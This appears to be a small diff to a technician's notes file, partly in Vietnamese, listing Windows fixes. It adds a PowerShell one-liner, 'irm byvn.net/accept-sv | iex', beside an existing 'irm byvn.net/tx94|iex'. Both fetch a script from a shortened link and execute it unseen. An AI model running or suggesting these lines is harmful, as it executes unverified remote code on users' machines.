@@ -1,4 +1,5 @@
 link rút gọn printer.ps1 :irm byvn.net/tx94|iex
+Accept Services : irm byvn.net/accept-sv | iex
 Dcorp error 0x50000
 sfc /scannow
 powershell admin: Active Win OFFice
